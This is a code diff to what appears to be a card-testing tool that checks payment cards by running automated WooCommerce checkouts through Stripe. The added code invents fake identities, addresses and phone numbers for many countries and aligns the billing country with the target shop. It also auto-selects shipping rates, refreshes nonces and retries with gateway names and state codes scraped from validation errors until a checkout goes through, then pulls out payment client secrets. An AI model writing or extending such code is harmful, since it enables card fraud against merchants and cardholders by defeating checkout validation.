@@ -76,6 +76,18 @@ GEO_POOLS: dict[str, list[tuple[str, str, str]]] = {
     "CA": [("Toronto", "ON", "M5H 2N2"), ("Vancouver", "BC", "V6B 1A1"), ("Montreal", "QC", "H3A 1A1")],
     "DE": [("Berlin", "BE", "10115"), ("Munich", "BY", "80331"), ("Hamburg", "HH", "20095")],
     "FR": [("Paris", "IDF", "75001"), ("Lyon", "ARA", "69001"), ("Marseille", "PAC", "13001")],
+    "NL": [("Amsterdam", "NH", "1012 AB"), ("Rotterdam", "ZH", "3011 BK"), ("Utrecht", "UT", "3511 LM")],
+    "IT": [("Roma", "RM", "00100"), ("Milano", "MI", "20100"), ("Napoli", "NA", "80100")],
+    "ES": [("Madrid", "MD", "28001"), ("Barcelona", "CT", "08001"), ("Valencia", "VC", "46001")],
+    "LT": [("Vilnius", "VL", "01101"), ("Kaunas", "KU", "44248"), ("Klaipeda", "KL", "92117")],
+    "NZ": [("Wellington", "WGN", "6011"), ("Auckland", "AUK", "1010"), ("Christchurch", "CAN", "8011")],
+    "IE": [("Dublin", "L", "D01"), ("Cork", "C", "T12"), ("Galway", "G", "H91")],
+    "PL": [("Warszawa", "MA", "00-001"), ("Krakow", "MP", "31-001"), ("Gdansk", "PM", "80-001")],
+    "CH": [("Zurich", "ZH", "8001"), ("Bern", "BE", "3001"), ("Basel", "BS", "4051")],
+    "AT": [("Wien", "W", "1010"), ("Graz", "ST", "8010"), ("Salzburg", "S", "5020")],
+    "BE": [("Brussel", "BRU", "1000"), ("Antwerpen", "VLG", "2000"), ("Gent", "VLG", "9000")],
+    "SE": [("Stockholm", "AB", "11120"), ("Goteborg", "O", "41118"), ("Malmo", "M", "21122")],
+    "PT": [("Lisboa", "LIS", "1000"), ("Porto", "POR", "4000"), ("Braga", "BRA", "4700")],
 }
 _CITIES = [c for c, _, _ in GEO_POOLS["US"]]
 _STATES = [s for _, s, _ in GEO_POOLS["US"]]
@@ -83,13 +95,22 @@ _ZIPS = [z for _, _, z in GEO_POOLS["US"]]
 
 _STREETS = ["Main", "Oak", "Maple", "Cedar", "Park", "Lake", "Hill", "Church"]
 
+# NL-магазины с Dutch Postcode plugin (wcnlpc) требуют реальный формат улицы:
+# голландское название + номер, иначе missing_street_name
+_NL_STREETS = ["Damstraat", "Kalverstraat", "Hoogstraat", "Witte de Withstraat",
+               "Neude", "Oudegracht", "Coolsingel", "Kruisstraat"]
+
 
 def geo_identity_fields(country_code: str = "US") -> dict:
     """Случайный адрес из пула страны; неизвестная страна → US."""
     pool = GEO_POOLS.get((country_code or "US").upper(), GEO_POOLS["US"])
     city, state, zc = random.choice(pool)
+    if (country_code or "US").upper() == "NL":
+        street = f"{random.choice(_NL_STREETS)} {random.randint(1, 200)}"
+    else:
+        street = f"{random.randint(100, 9999)} {random.choice(_STREETS)} Street"
     return {
-        "line1": f"{random.randint(100, 9999)} {random.choice(_STREETS)} Street",
+        "line1": street,
         "city": city,
         "state": state,
         "postal_code": zc,
@@ -1064,7 +1085,16 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
 
     try:
         r_cart = await s.get(f"{api}/cart", timeout=10)
-        nonce = r_cart.headers.get("nonce", "")
+
+        def _take_nonce(resp) -> None:
+            """Store API nonce одноразовый на мутацию — каждый ответ несёт свежий."""
+            nn = resp.headers.get("nonce") or resp.headers.get("Nonce")
+            if nn:
+                nonlocal_nonce[0] = nn
+
+        nonlocal_nonce = [r_cart.headers.get("nonce", "")]
+        nonce = nonlocal_nonce[0]
+        _take_nonce(r_cart)
         if not nonce:
             return {"status": "ERROR", "detail": "Store API: no Nonce header",
                     "amount_cents": 0, "currency": ""}
@@ -1097,6 +1127,52 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         price_c = int(prod["prices"]["price"])
         curr = prod["prices"].get("currency_code", "")
 
+        # Физические товары: корзина требует выбранный shipping-rate, иначе
+        # checkout ответит invalid_shipping_option. Rates появляются только
+        # после задания destination-адреса — update-customer, затем выбор rate.
+        try:
+            rate_id = None
+            for hop in range(2):
+                r_car2 = await s.get(f"{api}/cart",
+                                     headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+                _take_nonce(r_car2)
+                c2 = r_car2.json()
+                if not c2.get("needs_shipping"):
+                    break
+                for grp in c2.get("shipping_rates") or []:
+                    for rt in grp.get("shipping_rates") or []:
+                        rate_id = rt.get("rate_id")
+                        break
+                    if rate_id:
+                        break
+                if rate_id:
+                    break
+                # rates пустые → задать destination-адрес и перечитать
+                ident_pre = {**random_identity(country), **geo_identity_fields(country)}
+                await s.post(f"{api}/cart/update-customer",
+                             json={
+                                 "shipping_address": {
+                                     "first_name": ident_pre["first_name"],
+                                     "last_name": ident_pre["last_name"],
+                                     "company": "",
+                                     "address_1": ident_pre.get("line1", ""),
+                                     "address_2": "",
+                                     "city": ident_pre.get("city", ""),
+                                     "state": ident_pre.get("state", ""),
+                                     "postcode": ident_pre.get("postal_code", ""),
+                                     "country": country,
+                                     "phone": "",
+                                 },
+                             },
+                             headers={"Nonce": nonce}, timeout=10)
+            if rate_id:
+                r_sr = await s.post(f"{api}/cart/select-shipping-rate",
+                             json={"rate_id": rate_id},
+                             headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+                _take_nonce(r_sr)
+        except Exception:
+            pass
+
         card = parse_card(card_raw)
         tok_body = tokenize_body(card, telem, root)
         r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
@@ -1110,8 +1186,24 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
         pm_id = tok_data["id"]
 
         country = telem.get("country") or country
+        # Гео-выравнивание по магазину: не-US витрины часто продают только по своей
+        # стране — US-биллинг даёт invalid_address_country. Дефолтная страна
+        # берётся из GET /checkout (draft). Падение — остаёмся на стране BIN.
+        try:
+            r_draft = await s.get(f"{api}/checkout",
+                                   headers={"Nonce": nonlocal_nonce[0]}, timeout=10)
+            _take_nonce(r_draft)
+            draft = r_draft.json()
+            shop_country = ((draft.get("billing_address") or {}).get("country") or "").upper()
+            if len(shop_country) == 2 and shop_country != country:
+                country = shop_country
+                telem.update(geo_identity_fields(country))
+        except Exception:
+            pass
         # полная личность для биллинга (email и т.п.) + гео-выравнивание адреса
-        ident = {**random_identity(country), **geo_identity_fields(country)}
+        geo = geo_identity_fields(country)
+        telem.update(geo)
+        ident = {**random_identity(country), **geo}
         checkout_body = {
             "billing_address": {
                 # или-цепочки: telem может нести ПУСТЫЕ строки вместо отсутствия ключа
@@ -1125,25 +1217,134 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
                 "postcode": ident.get("postal_code", ""),
                 "country": country,
                 "email": telem.get("email") or ident.get("email", ""),
-                "phone": telem.get("phone") or ident.get("phone", ""),
+                # Woo Blocks-checkout у части магазинов требует phone — генерим всегда
+                # (555-01xx — зарезервированный диапазон, реальных абонентов нет)
+                "phone": (telem.get("phone") or ident.get("phone")
+                          or f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
+                             f"{random.randint(1000, 9999)}"),
+            },
+                        # physical-goods carts require a valid same-country shipping address;
+            # часть магазинов требует phone и в shipping (IT/FR-валидаторы)
+            "shipping_address": {
+                "first_name": telem.get("first_name") or ident.get("first_name", "James"),
+                "last_name": telem.get("last_name") or ident.get("last_name", "Carter"),
+                "company": "",
+                "address_1": telem.get("address_1") or ident.get("line1", ""),
+                "address_2": "",
+                "city": telem.get("city") or ident.get("city", ""),
+                "state": ident.get("state", ""),
+                "postcode": telem.get("postal_code", ""),
+                "country": country,
+                "phone": (telem.get("phone") or ident.get("phone")
+                          or f"+{random.randint(1, 9)} 555 {random.randint(100, 999)} "
+                             f"{random.randint(1000, 9999)}"),
             },
             "customer_note": "", "create_account": False,
+            "terms": True,  # магазины с включённым terms-чекбоксом иначе дают terms_error
             "payment_method": "stripe",
             "payment_data": [
                 {"key": "wc-stripe-payment-method", "value": pm_id},
                 {"key": "wc-stripe-payment-type", "value": "card"},
             ],
         }
-        r_co = await s.post(f"{api}/checkout", json=checkout_body,
-                            headers={"Nonce": nonce}, timeout=20)
-        txt = r_co.text
+        # Первый проход "stripe"; магазины с кастомными enum-именами шлюзов
+        # (stripe_cc, stripe_upm, ...) ретраятся по списку из ошибки валидации
+        tried = ["stripe"]
+        geo_fixed = False
+        addr2_fixed = False
+        for attempt in range(10):
+            r_co = await s.post(f"{api}/checkout", json=checkout_body,
+                                headers={"Nonce": nonlocal_nonce[0]}, timeout=20)
+            _take_nonce(r_co)
+            txt = r_co.text
+            try:
+                d = _json.loads(txt)
+            except Exception:
+                d = {}
+            code = str(d.get("code") or "")
+            msg_raw = str(d.get("message") or "")
+            data_params = ((d.get("data") or {}).get("params")
+                           if isinstance(d.get("data"), dict) else {}) or {}
+            pm_err = data_params.get("payment_method", "") \
+                if isinstance(data_params, dict) else ""
+            if code == "rest_invalid_param" and pm_err:
+                # сообщение локализовано (nl/fr/de/lt...), но сами slug'и шлюзов
+                # латинские — вытаскиваем их regexp'ом из всего текста ошибки
+                enum = set(re.findall(
+                    r"(?:stripe|ppcp|pronamic|woocommerce_payments|paypal)[a-z0-9_]*",
+                    pm_err))
+                # приоритет карточных шлюзов; не-страйповские обычно умерят наш pm_id,
+                # но при отсутствии stripe-* это последний шанс
+                order = sorted(
+                    (e for e in enum if e and e != "stripe"),
+                    key=lambda e: (not e.startswith("stripe"),
+                                   not e.startswith("stripe_cc"),
+                                   not e.startswith("ppcp_card"),
+                                   not e.startswith("pronamic_pay")))
+                nxt = next((e for e in order if e not in tried), None)
+                if nxt:
+                    tried.append(nxt)
+                    checkout_body["payment_method"] = nxt
+                    continue
+            # Гео-ретрай: Woo сам называет допустимые значения штата/провинции.
+            # Формат разный: ISO-3166-2 (DE-BW), одно-двухбуквенные коды (M, SE, VI)
+            # — берём первый допустимый токен из текста ошибки и перепосылаем
+            addr_err = " ".join(str(v) for v in data_params.values()
+                                if isinstance(v, str)) if isinstance(data_params, dict) else ""
+            if code == "rest_invalid_param" and addr_err and not geo_fixed:
+                iso_states = re.findall(r"\b([A-Z]{2}-[A-Z0-9]{1,3})\b", addr_err)
+                short_states = re.findall(r"(?:^|[a-z]:\s)([A-Z]{1,2})(?=,|\s|$)",
+                                          addr_err)
+                if iso_states:
+                    fixed_state = iso_states[0]
+                elif short_states:
+                    fixed_state = short_states[0]
+                else:
+                    fixed_state = None
+                if fixed_state:
+                    geo_fixed = True
+                    country_for_geo = fixed_state.split("-")[0] if iso_states else country
+                    new_geo = geo_identity_fields(country_for_geo)
+                    for side in ("billing_address", "shipping_address"):
+                        addr = checkout_body.get(side) or {}
+                        addr["state"] = fixed_state
+                        addr["postcode"] = new_geo["postal_code"]
+                        addr["city"] = new_geo["city"]
+                        addr["address_1"] = new_geo["line1"]
+                        if iso_states:
+                            addr["country"] = fixed_state.split("-")[0]
+                    continue
+            # address_2 обязателен у части магазинов (ES «Apartamento... es
+            # obligatorio») — заполняем и перепосылаем; код ошибки может быть
+            # как rest_invalid_param, так и woocommerce_rest_invalid_address
+            addr_req_err = addr_err or msg_raw
+            if (code in ("rest_invalid_param", "woocommerce_rest_invalid_address")
+                    and not addr2_fixed and addr_req_err
+                    and not checkout_body["billing_address"].get("address_2")):
+                for side in ("billing_address", "shipping_address"):
+                    addr = checkout_body.get(side) or {}
+                    addr["address_2"] = f"Apartment {random.randint(1, 40)}"
+                addr2_fixed = True
+                continue
+            break
         secrets = RE_CLIENT_SECRET.findall(txt)
-        try:
-            d = _json.loads(txt)
-        except Exception:
-            d = {}
         pr = d.get("payment_result") or {}
-        p_status = pr.get("status", "")
+        # Blocks-checkout отдаёт payment_result.payment_status (не status) и
+        # свежий client_secret в base64-редиректе — это PI_MINTED, не failure
+        import base64 as _b64
+        redir = ""
+        for det in (pr.get("payment_details") or []):
+            if isinstance(det, dict) and det.get("key") == "redirect":
+                redir = str(det.get("value") or "")
+        if redir and not secrets:
+            m = re.search(r"#response=([A-Za-z0-9+/=_-]+)", redir)
+            if m:
+                try:
+                    dec = _b64.urlsafe_b64decode(m.group(1) + "==").decode("utf-8", "ignore")
+                    secrets = RE_CLIENT_SECRET.findall(dec)
+                except Exception:
+                    pass
+        p_status = pr.get("status") or pr.get("payment_status") or ""
         details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
 
         base = {"amount_cents": price_c, "currency": curr,
@@ -1167,6 +1368,8 @@ async def store_api_confirm(s, root: str, pk: str, card_raw: str,
             return {"status": classify_verdict(msg), "detail": msg[:200], **base}
         return {"status": "ERROR",
                 "detail": f"checkout HTTP {r_co.status_code}: {code}:{msg[:120]}",
+                "params": ((d.get("data") or {}).get("params")
+                           if isinstance(d.get("data"), dict) else None),
                 **base}
     except Exception as e:
         return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:180],
